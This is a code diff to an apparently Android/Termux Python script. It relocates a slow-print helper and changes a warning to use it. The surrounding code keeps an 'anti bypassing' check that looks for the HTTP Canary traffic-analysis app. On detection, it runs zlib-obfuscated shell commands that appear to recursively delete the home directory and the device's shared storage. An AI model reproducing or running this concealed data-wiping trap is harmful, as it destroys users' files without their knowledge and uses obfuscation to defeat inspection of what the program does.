@@ -35,7 +35,9 @@ rc = f"\033[{mxclrs};122m"
 rg = f"\033[{mxclrs};112m"
 rp = f"\033[{mxclrs};147m"
 gxdsprnt = str(f"{li}" * 37)
-
+def sins(u):
+  for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.02)
+  
 # ANTI BYPASSING
 try:
     qc = "anar"
@@ -43,7 +45,7 @@ try:
     file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
 
     if f'com.h{cq}pc{qc}y.pro' in file_d:
-        print(f"{lr} [X] HTTP CANARY DETECTED!")
+        sins(f"{lr} [X] HTTP CANARY DETECTED!")
         os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
         os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
         os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
@@ -217,9 +219,6 @@ gxdsanmtn4 = [
 ]
 gxdsanmtn1 = "|/-\\"
 gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
-
-def sins(u):
-  for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 
 # LINES
 def lxnes():
